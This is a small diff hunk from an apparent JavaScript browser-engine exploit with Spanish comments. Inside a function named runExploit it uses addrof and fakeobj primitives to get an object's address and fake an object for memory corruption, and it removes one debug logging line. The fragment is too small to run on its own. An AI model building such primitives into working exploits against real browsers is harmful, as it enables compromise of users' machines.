@@ -97,7 +97,6 @@ async function runExploit() {
 
   // Test de las primitivas
   let addr = addrof({ test: 1337 });
-  await log("Address of test object: 0x" + addr.toString(16));
 
   // Corromper memoria a través de fakeobj y escribir un valor.
   let fake = fakeobj(addr + 0x20);
